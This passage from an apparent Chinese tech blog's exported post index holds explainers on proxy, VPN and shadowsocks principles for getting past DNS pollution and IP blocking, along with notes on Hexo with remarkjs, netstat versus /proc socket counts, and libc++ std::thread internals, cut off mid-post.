总结本文提出并实现了，利用dropwizard/metrics做数据统计，kafka做数据传输，zabbix做数据展示的完整流程。 对于开发者来说，不需要关心具体的实现，只需要按dropwizard/metrics的文档做统计，再配置上metrics-kafka reporter即可。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>metrics</tag>
        <tag>zabbix</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网的一些原理]]></title>
    <url>%2Fsomething-about-science-surf-the-internet%2F</url>
    <content type="text"><![CDATA[知其所以然本文不是教程向，倾向于分析科学上网的一些原理。知其所以然，才能更好地使用工具，也可以创作出自己的工具。 科学上网的工具很多，八仙过海，各显神通，而且综合了各种技术。尝试从以下四个方面来解析一些其中的原理。大致先原理，再工具的顺序。 dns http/https proxy vpn socks proxy 一个http请求发生了什么？这个是个比较流行的面试题，从中可以引出很多的内容。大致分为下面四个步骤： dns解析，得到IP 向目标IP发起TCP请求 发送http request 服务器回应，浏览器解析 还有很多细节，更多参考： http://fex.baidu.com/blog/2014/05/what-happen/ http://stackoverflow.com/questions/2092527/what-happens-when-you-type-in-a-url-in-browser http://div.io/topic/609?page=1 从FE的角度上再看输入url后都发生了什么 DNS/域名解析可以看到dns解析是最初的一步，也是最重要的一步。比如访问亲友，要知道他的正确的住址，才能正确地上门拜访。 dns有两种协议，一种是UDP（默认），一种是TCP。 udp 方式，先回应的数据包被当做有效数据在linux下可以用dig来检测dns。国内的DNS服务器通常不会返回正常的结果。下面以google的8.8.8.8 dns服务器来做测试，并用wireshark来抓包，分析结果。1dig @8.8.8.8 www.youtube.com 从wireshark的结果，可以看到返回了三个结果，前面两个是错误的，后面的是正确的。 但是，对于dns客户端来说，它只会取最快回应的的结果，后面的正确结果被丢弃掉了。因为中间被插入了污染包，所以即使我们配置了正确的dns服务器，也解析不到正确的IP。 tcp 方式，有时有效，可能被rest再用TCP下的DNS来测试下:1dig @8.8.8.8 +tcp www.youtube.com 从wireshark的结果，可以看出在TCP三次握手成功时，本地发出了一个查询www.youtube.com的dns请求，结果，很快收到了一个RST回应。而RST回应是在TCP连接断开时，才会发出的。所以可以看出，**TCP通讯受到了干扰，DNS客户端因为收到RST回应，认为对方断开了连接，因此也无法收到后面正确的回应数据包了。** 再来看下解析twitter的结果：1dig @8.8.8.8 +tcp www.twitter.com 结果：12345www.twitter.com. 590 IN CNAME twitter.com.twitter.com. 20 IN A 199.59.150.7 80twitter.com. 20 IN A 199.59.150.7twitter.com. 20 IN A 199.59.149.230twitter.com. 20 IN A 199.59.150.39 这次返回的IP是正确的。但是尝试用telnet 去连接时，会发现连接不上。1telnet 199.59.150.7 80 但是，在国外服务器去连接时，可以正常连接，完成一个http请求。可见一些IP的访问被禁止了。123456789101112131415$ telnet 199.59.150.7 80Trying 199.59.150.7...Connected to 199.59.150.7.Escape character is &apos;^]&apos;.GET / HTTP/1.0HOST:www.twitter.comHTTP/1.0 301 Moved Permanentlycontent-length: 0date: Sun, 08 Feb 2015 06:28:08 UTClocation: https://www.twitter.com/server: tsa_aset-cookie: guest_id=v1%3A142337688883648506; Domain=.twitter.com; Path=/; Expires=Tue, 07-Feb-2017 06:28:08 UTCx-connection-hash: 0f5eab0ea2d6309109f15447e1da6b13x-response-time: 2 黑名单/白名单想要获取到正确的IP，自然的黑名单/白名单两种思路。 下面列出一些相关的项目：123https://github.com/holmium/dnsforwarderhttps://code.google.com/p/huhamhire-hosts/https://github.com/felixonmars/dnsmasq-china-list 本地DNS软件 修改hosts文件相信大家都很熟悉，也有一些工具可以自动更新hosts文件的。 浏览器pac文件主流浏览器或者其插件，都可以配置pac文件。pac文件实际上是一个JS文件，可以通过编程的方式来控制dns解析结果。其效果类似hosts文件，不过pac文件通常都是由插件控制自动更新的。只能控制浏览器的dns解析。 本地dns服务器，dnsmasq在linux下，可以自己配置一个dnsmasq服务器，然后自己管理dns。不过比较高级，也比较麻烦。 顺便提一下，实际上，kubuntu的NetworkManager会自己启动一个私有的dnsmasq进程来做dns解析。不过它侦听的是127.0.1.1，所以并不会造成冲突。1/usr/sbin/dnsmasq --no-resolv --keep-in-foreground --no-hosts --bind-interfaces --pid-file=/run/sendsigs.omit.d/network-manager.dnsmasq.pid --listen-address=127.0.1.1 --conf-file=/var/run/NetworkManager/dnsmasq.conf 路由器智能DNS基于OpenWRT/Tomoto的路由器可以在上面配置dns server，从而实现在路由器级别智能dns解析。现在国内的一些路由器是基于OpenWRT的，因此支持配置dns服务器。参考项目：1https://github.com/clowwindy/ChinaDNS http proxyhttp proxy请求和没有proxy的请求的区别在chrome里没有设置http proxy的请求头信息是这样的：12GET /nocache/fesplg/s.gifHost: www.baidu.com 在设置了http proxy之后，发送的请求头是这样的：123GET http://www.baidu.com//nocache/fesplg/s.gifHost: www.baidu.comProxy-Connection: keep-alive 区别是配置http proxy之后，会在请求里发送完整的url。 client在发送请求时，如果没有proxy，则直接发送path，如果有proxy，则要发送完整的url。 实际上http proxy server可以处理两种情况，即使客户端没有发送完整的url，因为host字段里，已经有host信息了。 为什么请求里要有完整的url？ 历史原因。 目标服务器能否感知到http proxy的存在？当我们使用http proxy时，有个问题可能会关心的：目标服务器能否感知到http proxy的存在？ 一个配置了proxy的浏览器请求头：123GET http://55.75.138.79:9999/ HTTP/1.1Host: 55.75.138.79:9999Proxy-Connection: keep-alive 实际上目标服务器接收到的信息是这样子的：123GET / HTTP/1.1Host: 55.75.138.79:9999Connection: keep-alive 可见，http proxy服务器并没有把proxy相关信息发送到目标服务器上。 因此，目标服务器是没有办法知道用户是否使用了http proxy。 http proxy keep-alive实际上Proxy-Connection: keep-alive这个请求头是错误的，不在标准里： 因为http1.1 默认就是Connection: keep-alive 如果client想要http proxy在请求之后关闭connection，可以用Proxy-Connection: close 来指明。 http://homepage.ntlworld.com/jonathan.deboynepollard/FGA/web-proxy-connection-header.html http proxy authentication当http proxy需要密码时： 第一次请求没有密码，则会回应12HTTP/1.1 407 Proxy authentication requiredProxy-Authenticate: Basic realm=&quot;Polipo&quot; 浏览器会弹出窗口，要求输入密码。如果密码错误的话，回应头是：1HTTP/1.1 407 Proxy authentication incorrect 如果是配置了密码，发送的请求头则是：1234GET http://www.baidu.com/ HTTP/1.1Host: www.baidu.comProxy-Connection: keep-aliveProxy-Authorization: Basic YWRtaW46YWRtaW4= Proxy-Authorization实际是Base64编码。1base64(&quot;admin:admin&quot;) == &quot;YWRtaW46YWRtaW4=&quot; http proxy对于不认识的header和方法的处理：http proxy通常会尽量原样发送，因为很多程序都扩展了http method，如果不支持，很多程序都不能正常工作。 客户端用OPTIONS 请求可以探测服务器支持的方法。但是意义不大。 https proxy当访问一个https网站时，https://github.com 先发送connect method，如果支持，会返回200 123456CONNECT github.com:443 HTTP/1.1Host: github.comProxy-Connection: keep-aliveUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36HTTP/1.1 200 OK http tunnelhttp://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_tunneling 通过connect method，http proxy server实际上充当tcp转发的中间人。比如，用nc 通过http proxy来连42端口：1$ nc -x10.2.3.4:8080 -Xconnect host.example.com 42 原理是利用CONNECT方法，让http proxy服务器充当中间人。 https proxy的安全性？proxy server可以拿到什么信息？ 通过一个http proxy去访问支付宝是否安全？ 可以知道host，即要访问的是哪个网站 拿不到url信息 https协议保证不会泄露通信内容 TLS(Transport Layer Security) 在握手时，生成强度足够的随机数 TLS 每一个record都要有一个sequence number，每发一个增加一个，并且是不能翻转的。 TLS 保证不会出现重放攻击 TLS的内容很多，这里说到关于安全的一些关键点。 注意事项： 确保是https访问 确保访问网站的证书没有问题 是否真的安全了？更强的攻击者！ 流量劫持 —— 浮层登录框的隐患 http://fex.baidu.com/blog/2014/06/danger-behind-popup-login-dialog/ 所以，尽量不要使用来路不明的http/https proxy，使用公开的wifi也要小心。 goagent工作原理 local http/https proxy 伪造https证书，导入浏览器信任列表里 浏览器配置http/https proxy 解析出http/https request的内容。然后把这些请求内容打包，发给GAE服务器 与GAE通信通过http/https，内容用RC4算法加密 GAE服务器，再调用google提供的 urlfetch，来获得请求的回应，然后再把回应打包，返回给客户端。 客户端把回应传给浏览器 自带dns解析服务器 在local/certs/ 目录下可以找到缓存的伪造的证书 fiddler抓取https数据包是同样原理。 goagent会为每一个https网站伪造一个证书，并缓存起来。比如下面这个github的证书： goagent的代码在3.0之后，支持了很多其它功能，变得有点混乱了。 以3.2.0 版本为例： 主要的代码是在server/gae/gae.py 里。https://github.com/goagent/goagent/blob/v3.2.0/server/gae/gae.py#L107 一些代码实现的细节： 支持最长的url是2083，因为gae sdk的限制。https://github.com/AppScale/gae_sdk/blob/master/google/appengine/api/taskqueue/taskqueue.py#L241 如果回应的内容是/text, json, javascript，且 &gt; 512会用gzip来压缩 处理一些Content-Range 的回应内容。Content-Range 的代码虽然只有一点点，但是如果是不熟悉的话，要花上不少工夫。 goagent的生成证书的代码在 local/proxylib.py的这个函数里： 12@staticmethoddef _get_cert(commonname, sans=()): 为什么goagent可以看视频？因为很多网站都是http协议的。有少部分是rmtp协议的，也有是rmtp over http的。 在youku看视频的一个请求数据：123456789http://14.152.72.22/youku/65748B784A636820C5A81B41C7/030002090454919F64A167032DBBC7EE242548-46C9-EB9D-916D-D8BA8D5159D3.flv?&amp;start=158response：Connection:closeContent-Length:7883513Content-Type:video/x-flvDate:Wed, 17 Dec 2014 17:55:24 GMTETag:&quot;316284225&quot;Last-Modified:Wed, 17 Dec 2014 15:21:26 GMTServer:YOUKU.GZ 可以看到，有ETag，有长度信息等。 goagent缺点 只是http proxy，不能代理其它协议 google的IP经常失效 不支持websocket协议 配置复杂 vpn流行的vpn类型 PPTP，linux pptpd，安全性低，不能保证数据完整性或者来源，MPPE加密暴力破解 L2TP，linux xl2tpd，预共享密钥可以保证安全性 SSTP，基于HTTPS，微软提出。linux开源实现SoftEther VPN OPENVPN，基于SSL，预共享密钥可以保证安全性 所谓的SSL VPN，各家厂商有自己的实现，没有统一的标准 新型的staless VPN，像sigmavpn/ShadowVPN等 现状： PPTP/L2TP 可用，但可能会不管用 SoftEther VPN/OPENVPN 可能会导致服务器被封IP，连不上，慎用 ShadowVPN可用，sigmavpn没有测试 猜测下为什么PPTP，L2TP这些方案容易被检测到？ 可能是因为它们的协议都有明显的标头： 转发的是ppp协议数据，握手有特征 PPTP协议有GRE标头和PPP标头 L2TP有L2TP标头和PPP标头 L2TP要用到IPsec 参考： https://technet.microsoft.com/zh-cn/library/cc771298(v=ws.10).aspx 网页版的SSL VPN有些企业，或者学校里，会有这种VPN： 网页登陆帐号 设置IE代理，为远程服务器地址 通过代理浏览内部网页 这种SSL VPN原理很简单，就是一个登陆验证的http proxy，其实并不能算是VPN？ 新型的staless vpnVPN，sigmavpn/ShadowVPN这种新型VPN的原理是，利用虚拟的网络设备TUN和TAP，把请求数据先发给虚拟设备，然后把数据加密转发到远程服务器。（VPN都这原理？） 1you &lt;-&gt; local &lt;-&gt; protocol &lt;-&gt; remote &lt;-&gt; ...... &lt;-&gt; remote &lt;-&gt; protocol &lt;-&gt; local &lt;-&gt; peer 这种新型VPN的特点是很轻量，没有传统VPN那么复杂的握手加密控制等，而向个人，而非企业。SigmaVPN号称只有几百行代码。 参考： http://zh.wikipedia.org/wiki/TUN%E4%B8%8ETAP https://code.google.com/p/sigmavpn/wiki/Introduction ubuntu pptp vpn server安装ubuntu官方参考文档：https://help.ubuntu.com/community/PPTPServer vps 要开启ppp和nat网络转发的功能 设置MTU，建议设置为1200以下，因为中间网络可能很复杂，MTU太大可能导致连接失败 1iptables -A FORWARD -p tcp --syn -s 192.168.0.0/24 -j TCPMSS --set-mss 1200 socks proxy rfc 文档： http://tools.ietf.org/html/rfc1928 wiki上的简介： http://en.wikipedia.org/wiki/SOCKS#SOCKS5 socks4/socks4a 已经过时 socks5 socks5支持udp，所以如果客户端把dns查询也走socks的话，那么就可以直接解决dns的问题了。 socks proxy 握手的过程socks5流程 客户端查询服务器支持的认证方式 服务器回应支持的认证方式 客户端发送认证信息，服务器回应 如果通过，客户端直接发送TCP/UDP的原始数据，以后proxy只单纯转发数据流，不做任何处理了 socks proxy 自身没有加密机制，简单的TCP/UDP forward socks协议其实是相当简单的，用wireshark抓包，结合netty-codec-socks，很容易可以理解其工作过程。https://github.com/netty/netty/tree/master/codec-socks ssh socks proxy如果有一个外国的服务器，可以通过ssh连接登陆，那么可以很简单地搭建一个本地的socks5代理。 XShell可以通过“转移规则”来配置本地socks服务器，putty也有类似的配置： linux下命令行启动一个本地sock5服务器：1ssh -D 1080 user@romoteHost ssh还有一些端口转发的技巧，这对于测试网络程序，绕过防火墙也是很有帮助的。 参考：http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/ shadowsocks的工作原理shadowsocks是非常流行的一个代理工具，其原理非常简单。 客户端服务器预共享密码 本地socks5 proxy server（有没有想起在学校时用的ccproxy？） 软件/浏览器配置本地socks代理 本地socks server把数据包装，AES256加密，发送到远程服务器 远程服务器解密，转发给对应的服务器 123app =&gt; local socks server(encrypt) =&gt; shadowsocks server(decrypt) =&gt; real hostapp &lt;= (decrypt) local socks server &lt;= (encrypt) shadowsocks server &lt;= real host 其它的一些东东： 一个端口一个密码，没有用户的概念 支持多个worker并发 协议简单，比socks协议还要简单，抽取了socks协议的部分 shadowsoks的优点 中间没有任何握手的环节，直接是TCP数据流 速度快 shadowsocks的安全性 服务器可以解出所有的TCP/UDP数据 中间人攻击，重放攻击 所以，对于第三方shadow socks服务器，要慎重使用。 在使用shadowsocks的情况下，https通迅是安全的，但是仍然有危险，参见上面http proxy安全的内容。 vpn和socks代理的区别从原理上来说，socks代理会更快，因为转发的数据更少。 因为vpn转发的是ppp数据包，ppp协议是数据链路层(data link layer)的协议。socks转发的是TCP/UDP数据，是传输(transport)层。 VPN的优点是很容易配置成全局的，这对于很多不能配置代理的程序来说很方便。而配置全局的socks proxy比较麻烦，目前貌似还没有简单的方案。 linux下一些软件配置代理的方法 bash/shell 对于shell，最简单的办法是在命令的前面设置下http_porxy的环境变量。1http_proxy=http://127.0.0.1:8123 wget http://test.com 推荐的做法是在~/.bashrc 文件里设置两个命令，开关http proxy：12alias proxyOn='export https_proxy=http://127.0.0.1:8123 &amp;&amp; http_proxy=http://127.0.0.1:8123'alias proxyOff='unset https_proxy &amp;&amp; unset http_proxy' 注意，如果想sudo的情况下，http proxy仍然有效，要配置env_keep。 在/etc/sudoers.d/目录下增加一个env_keep的文件，内容是：1Defaults env_keep += &quot; http_proxy https_proxy ftp_proxy &quot; 参考：https://help.ubuntu.com/community/AptGet/Howto#Setting_up_apt-get_to_use_a_http-proxy GUI软件 现在大部分软件都可以设置代理。gnome和kde都可以设置全局的代理。 linux下不支持代理的程序使用socks代理：tsockstsocks利用LD_PRELOAD机制，代理程序里的connect函数，然后就可以代理所有的TCP请求了。不过dns请求，默认是通过udp来发送的，所以tsocks不能代理dns请求。 默认情况下，tsocks会先加载~/.tsocks.conf，如果没有，再加载/etc/tsocks.conf。对于local ip不会代理。 使用方法： 12sudo apt-get install tsocksLD_PRELOAD=/usr/lib/libtsocks.so wget http://www.facebook.com 基于路由器的方案基于路由器的方案有很多，原理和本机的方案是一样的，只不过把这些措施前移到路由器里。 路由器的方案的优点是很明显的： 手机/平板不用设置 公司/局域网级的代理 但是需要专门的路由器，刷固件等。 shadowsocks, shadowvpn都可以跑在路由器上。 一些项目收集： https://github.com/lifetyper/FreeRouter_V2 https://gist.github.com/wen-long/8644243 https://github.com/ashi009/bestroutetb 推荐的办法完全免费 chrome + switchsharp/SwitchyOmega + http proxy goagent 程序员的推荐 chrome + switchsharp/SwitchyOmega + socks5 proxy aws免费一年的服务器/其它国外免费云主机，节点位置决定速度，推荐东京机房 shadowsocks 第三方免费的服务器 shadowsocks服务器，微信公众号：pennyjob 手机软件： fqrouter shadowsocks client 商业软件安全性自己考虑 总结 新技术层出不穷 越流行，越容易失效 实现一个proxy其实相当简单 知其所以然，更好使用工具，也可以创作出自己的工具。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在hexo里配置remarkjs]]></title>
    <url>%2Fhexo-support-remarkjs%2F</url>
    <content type="text"><![CDATA[remarkjs是一个比较流行的用md格式写slides的库 ：https://github.com/gnab/remark 打算在hexo里增加对remark的支持。但是hexo会把所以的source目录下的md后缀的文件全部转换为html。这样就很蛋疼了。 研究了下，发现hexo支持html, xml等在文件最前面加上layout: false就不会转换加上hexo模板的内容。 12layout: false-------- 但是这个配置对于md后缀的文件不起效。 所以只能修改md后缀为其它后缀了。 在source目录下创建一个slides的目录； 新建test.html 1234567891011121314151617181920212223242526272829303132layout: false--------&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;/&gt; &lt;style type=&quot;text/css&quot;&gt; @import url(http://fonts.googleapis.com/css?family=Yanone+Kaffeesatz); @import url(http://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic); @import url(http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700,400italic); body &#123; font-family: &apos;Droid Serif&apos;; &#125; h1, h2, h3 &#123; font-family: &apos;Yanone Kaffeesatz&apos;; font-weight: normal; &#125; .remark-code, .remark-inline-code &#123; font-family: &apos;Ubuntu Mono&apos;; &#125; &lt;/style&gt; &lt;script src=&quot;http://gnab.github.io/remark/downloads/remark-latest.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var slideshow = remark.create(&#123; sourceUrl: &apos;/slides/test.mymd&apos; &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 新建test.mymd文件，里面是slide的内容： 123456class: center, middle# Hello World--- 重新deploy，hexo deploy 在浏览器里访问，http://localhost:4000/slides/test.html本站的测试例子：http://hengyunabc.github.io/slides/test.html hexo其实最好能提供一个exclude的配置，允许某些目录不处理。在github上提了一个issue：https://github.com/hexojs/hexo/issues/991]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>remarkjs</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[netstat统计的tcp连接数与⁄proc⁄pid⁄fd下socket类型fd数量不一致的分析]]></title>
    <url>%2Fnetstat-difference-proc-fd-socket-stat%2F</url>
    <content type="text"><![CDATA[最近，线上一个应用，发现socket数缓慢增长，并且不回收，超过警告线之后，被运维监控自动重启了。 首先到zabbix上观察JVM历史记录，发现JVM-Perm space最近两周没有数据，猜测是程序从JDK7切换到JDK8了。问过开发人员之后，程序已经很久没有重启了，最近才重新发布的。而在这期间，线上的Java运行环境已经从JDK7升级到JDK8了。 因为jdk8里没有Perm space了，换成了Metaspace。 netstat到线上服务器上，用netstat来统计进程的connection数量。1netstat -antp | grep pid | wc -l 发现比zabbix上的统计socket数量要少100多，netstat统计只有100多，而zabbix上监控数据有300多。 于是到/proc/$pid/fd下统计socket类型的fd数量：12cd /proc/$pid/fdls -al | grep socket | wc -l 发现数据和zabbix上的数据一致。 netstat是怎么统计的下载netstat的源代码http://unix.stackexchange.com/questions/21503/source-code-of-netstat1apt-get source net-tools 从netstat的代码里，大概可以看到是读取/proc/net/tcp里面的数据来获取统计信息的。 java和c版的简单netstat的实现java版的 http://www.cs.earlham.edu/~jeremiah/LinuxSocket.java C版的： http://www.netmite.com/android/mydroid/system/core/toolbox/netstat.c 用starce跟踪netstat1strace netstat -antp 可以发现netstat把/proc 下的很多数据都读取出来了。于是大致可以知道netstat是把/proc/pid/fd 下面的数据和/proc/net/下面的数据汇总，对照得到统计结果的。 哪些socket会没有被netstat统计到？又在网上找了下，发现这里有说到socket如果创建了，没有bind或者connect，就不会被netstat统计到。 http://serverfault.com/questions/153983/sockets-found-by-lsof-but-not-by-netstat 实际上，也就是如果socket创建了，没有被使用，那么就只会在/proc/pid/fd下面有，而不会在/proc/net/下面有相关数据。 简单测试了下，的确是这样：1int socket = socket(PF_INET,SOCK_STREAM,0); //不使用 另外，即使socket是使用过的，如果执行shutdown后，刚开始里，用netstat可以统计到socket的状态是FIN_WAIT1。过一段时间，netstat统计不到socket的信息的，但是在/proc/pid/fd下，还是可以找到。 中间的时候，自己写了个程序，把/proc/pid/fd 下的inode和/proc/net/下面的数据比较，发现的确有些socket的inode不会出现在/proc/net/下。 用lsof查看用lsof查看socket inode： 触发GC，回收socket于是尝试触发GC，看下socket会不会被回收：1jmap -histo:live &lt;pid&gt; 结果，发现socket都被回收了。 再看下AbstractPlainSocketImpl的finalize方法：123456/** * Cleans up if the user forgets to close it. */protected void finalize() throws IOException &#123; close();&#125; 可以看到socket是会在GC时，被close掉的。写个程序来测试下：123456789public class TestServer &#123; public static void main(String[] args) throws IOException, InterruptedException &#123; for(int i = 0; i &lt; 10; ++i)&#123; ServerSocket socket = new ServerSocket(i + 10000); System.err.println(socket); &#125; System.in.read(); &#125;&#125; 先执行，查看/proc/pid/fd，可以发现有相关的socket fd，再触发GC，可以发现socket被回收掉了。 其它的东东anon_inode:[eventpoll]1ls -al /proc/pid/fd 可以看到有像这样的输出：1661 -&gt; anon_inode:[eventpoll] 这种类型的inode，是epoll创建的。 再扯远一点，linux下java里的selector实现是epoll结合一个pipe来实现事件通知功能的。所以在NIO程序里，会有anon_inode:[eventpoll]和pipe类型的fd。 为什么tail -f /proc/$pid/fd/1 不能读取到stdout的数据http://unix.stackexchange.com/questions/152773/why-cant-i-tail-f-proc-pid-fd-1 总结原因是jdk升级之后，GC的工作方式有变化，FullGC执行的时间变长了，导致有些空闲的socket没有被回收。 本文比较乱，记录下一些工具和技巧。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>netstat</tag>
        <tag>gc</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in trobuleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[C++11的thread代码分析]]></title>
    <url>%2Fcpp11-thread%2F</url>
    <content type="text"><![CDATA[前言本文分析的是llvm libc++的实现：http://libcxx.llvm.org/ class threadthread类直接包装了一个pthread_t，在linux下实际是unsigned long int。 123class thread&#123; pthread_t __t_; 12 id get_id() const _NOEXCEPT &#123;return __t_;&#125;&#125; 用了一个std::unique_ptr来包装用户定义的线程函数： 创建线程用的是 1234567891011121314151617181920template &lt;class _Fp&gt;void*__thread_proxy(void* __vp)&#123; __thread_local_data().reset(new __thread_struct); std::unique_ptr&lt;_Fp&gt; __p(static_cast&lt;_Fp*&gt;(__vp)); (*__p)(); return nullptr;&#125; template &lt;class _Fp&gt;thread::thread(_Fp __f)&#123; std::unique_ptr&lt;_Fp&gt; __p(new _Fp(__f)); int __ec = pthread_create(&amp;__t_, 0, &amp;__thread_proxy&lt;_Fp&gt;, __p.get()); if (__ec == 0) __p.release(); else __throw_system_error(__ec, "thread constructor failed");&#125; thread::joinable() , thread::join(), thread::detach()再来看下thread::joinable() , thread::join(), thread::detach() 函数。也是相应调用了posix的函数。在调用join()之后，会把_t设置为0，这样再调用joinable()时就会返回false。对于_t变量没有memory barrier同步，感觉可能会有问题。 123456789101112131415161718192021bool joinable() const &#123;return __t_ != 0;&#125;voidthread::join()&#123; int ec = pthread_join(__t_, 0); __t_ = 0;&#125; voidthread::detach()&#123; int ec = EINVAL; if (__t_ != 0) &#123; ec = pthread_detach(__t_); if (ec == 0) __t_ = 0; &#125; if (ec) throw system_error(error_code(ec, system_category()), "thread::detach failed");&#125; thread::hardware_concurrency()thread::hardware_concurrency()函数，获取的是当前可用的processor的数量。调用的是sysconf(_SC_NPROCESSORS_ONLN)函数，据man手册： 12- _SC_NPROCESSORS_ONLN The number of processors currently online (available). 123456789101112unsignedthread::hardware_concurrency() _NOEXCEPT&#123; long result = sysconf(_SC_NPROCESSORS_ONLN); // sysconf returns -1 if the name is invalid, the option does not exist or // does not have a definite limit. // if sysconf returns some other negative number, we have no idea // what is going on. Default to something safe. if (result &lt; 0) return 0; return static_cast&lt;unsigned&gt;(result);&#125; thread::sleep_for和thread::sleep_untilsleep_for函数实际调用的是nanosleep函数： 12345678910111213141516171819202122232425voidsleep_for(const chrono::nanoseconds&amp; ns)&#123; using namespace chrono; if (ns &gt; nanoseconds::zero()) &#123; seconds s = duration_cast&lt;seconds&gt;(ns); timespec ts; typedef decltype(ts.tv_sec) ts_sec; _LIBCPP_CONSTEXPR ts_sec ts_sec_max = numeric_limits&lt;ts_sec&gt;::max(); if (s.count() &lt; ts_sec_max) &#123; ts.tv_sec = static_cast&lt;ts_sec&gt;(s.count()); ts.tv_nsec = static_cast&lt;decltype(ts.tv_nsec)&gt;((ns-s).count()); &#125; else &#123; ts.tv_sec = ts_sec_max; ts.tv_nsec = giga::num - 1; &#125; while (nanosleep(&amp;ts, &amp;ts) == -1 &amp;&amp; errno == EINTR) ; &#125;&#125; sleep_until函数用到了mutex, condition_variable, unique_lock，实际上调用的还是pthread_cond_timedwait函数： 1234567891011121314151617181920212223242526272829303132333435363738394041template &lt;class _Clock, class _Duration&gt;voidsleep_until(const chrono::time_point&lt;_Clock, _Duration&gt;&amp; __t)&#123; using namespace chrono; mutex __mut; condition_variable __cv; unique_lock&lt;mutex&gt; __lk(__mut); while (_Clock::now() &lt; __t) __cv.wait_until(__lk, __t);&#125; voidcondition_variable::__do_timed_wait(unique_lock&lt;mutex&gt;&amp; lk, chrono::time_point&lt;chrono::system_clock, chrono::nanoseconds&gt; tp) _NOEXCEPT&#123; using namespace chrono; if (!lk.owns_lock()) __throw_system_error(EPERM, "condition_variable::timed wait: mutex not locked"); nanoseconds d = tp.time_since_epoch(); if (d &gt; nanoseconds(0x59682F000000E941)) d = nanoseconds(0x59682F000000E941); timespec ts; seconds s = duration_cast&lt;seconds&gt;(d); typedef decltype(ts.tv_sec) ts_sec; _LIBCPP_CONSTEXPR ts_sec ts_sec_max = numeric_limits&lt;ts_sec&gt;::max(); if (s.count() &lt; ts_sec_max) &#123; ts.tv_sec = static_cast&lt;ts_sec&gt;(s.count()); ts.tv_nsec = static_cast&lt;decltype(ts.tv_nsec)&gt;((d - s).count()); &#125; else &#123; ts.tv_sec = ts_sec_max; ts.tv_nsec = giga::num - 1; &#125; int ec = pthread_cond_timedwait(&amp;__cv_, lk.mutex()-&gt;native_handle(), &amp;ts); if (ec != 0 &amp;&amp; ec != ETIMEDOUT) __throw_system_error(ec, "condition_variable timed_wait failed");&#125; std::notify_all_at_thread_exit 的实现先来看个例子，这个notify_all_at_thread_exit函数到底有什么用： 12345678910111213141516171819202122232425262728293031323334#include &lt;mutex&gt;#include &lt;thread&gt;#include &lt;condtion_variable&gt; std::mutex m;std::condition_variable cv; bool ready = false;ComplexType result; // some arbitrary type void thread_func()&#123; std::unique_lock&lt;std::mutex&gt; lk(m); // assign a value to result using thread_local data result = function_that_uses_thread_locals(); ready = true; std::notify_all_at_thread_exit(cv, std::move(lk));&#125; // 1. destroy thread_locals, 2. unlock mutex, 3. notify cv int main()&#123; std::thread t(thread_func); t.detach(); // do other work // ... // wait for the detached thread std::unique_lock&lt;std::mutex&gt; lk(m); while(!ready) &#123; cv.wait(lk); &#125; process(result); // result is ready and thread_local destructors have finished&#125; 可以看到std::notify_all_at_thread_exit 函数，实际上是注册了一对condition_variable，mutex，当线程退出时，notify_all。 下面来看下具体的实现： 这个是通过Thread-specific Data来实现的，具体可以参考：http://www.ibm.com/developerworks/cn/linux/thread/posix_threadapi/part2/ 但我个人觉得这个应该叫线程特定数据比较好，因为它是可以被别的线程访问的，而不是某个线程”专有“的。 简而言之，std::thread在构造的时候，创建了一个__thread_struct_imp对象。 __thread_struct_imp对象里，用一个vector来保存了pair&lt;condition_variable*, mutex*&gt;： 123456789class __thread_struct_imp&#123; typedef vector&lt;__assoc_sub_state*, __hidden_allocator&lt;__assoc_sub_state*&gt; &gt; _AsyncStates;&lt;strong&gt; typedef vector&lt;pair&lt;condition_variable*, mutex*&gt;, __hidden_allocator&lt;pair&lt;condition_variable*, mutex*&gt; &gt; &gt; _Notify;&lt;/strong&gt; _AsyncStates async_states_; _Notify notify_; 当调用notify_all_at_thread_exit函数时，把condition_variable和mutex，push到vector里： 12345void__thread_struct_imp::notify_all_at_thread_exit(condition_variable* cv, mutex* m)&#123; notify_.push_back(pair&lt;condition_variable*, mutex*&gt;(cv, m));&#125; 当线程退出时，会delete掉thread_struct_imp，也就是会调用thread_struct_imp的析构函数。 而在析构函数里，会调用历遍vector，unlock每个mutex，和调用condition_variable.notify_all()函数： 123456789101112131415__thread_struct_imp::~__thread_struct_imp()&#123; for (_Notify::iterator i = notify_.begin(), e = notify_.end(); i != e; ++i) &#123; i-&gt;second-&gt;unlock(); i-&gt;first-&gt;notify_all(); &#125; for (_AsyncStates::iterator i = async_states_.begin(), e = async_states_.end(); i != e; ++i) &#123; (*i)-&gt;__make_ready(); (*i)-&gt;__release_shared(); &#125;&#125; 更详细的一些封闭代码，我提取出来放到了gist上：https://gist.github.com/hengyunabc/d48fbebdb9bddcdf05e9 其它的一些东东关于线程的yield, 